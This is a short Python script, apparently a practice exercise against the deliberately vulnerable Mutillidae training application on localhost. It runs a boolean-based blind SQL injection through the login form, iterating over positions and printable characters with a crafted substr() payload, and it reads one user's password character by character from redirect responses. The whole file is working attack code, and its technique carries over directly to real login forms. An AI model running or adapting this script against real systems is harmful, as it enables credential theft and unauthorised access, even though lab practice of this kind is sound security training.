import requests
import string

proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def main():
    
    url="http://127.0.0.1/mutillidae/index.php?page=login.php"
    for i in range (1,25): 
    # in case our password is longer than 20. We can actually write something like password.length to control the loop, but since the password is stored in database, it will cost some times to approach to it. So I will simply use a relative long range.
        for j in string.printable:
            data = {'username':"' OR (substr(username, 1, 8)='user8069' AND substr(password,{},1)='{}') -- ".format(i,j),'password':"",'login-php-submit-button':"Login"}
            r = requests.post(url,data,proxies=proxy,allow_redirects=False)
            if r.status_code == 302:
                print(j)
        print("this is " + str(i) + "rounds")
if __name__ == "__main__":
    main()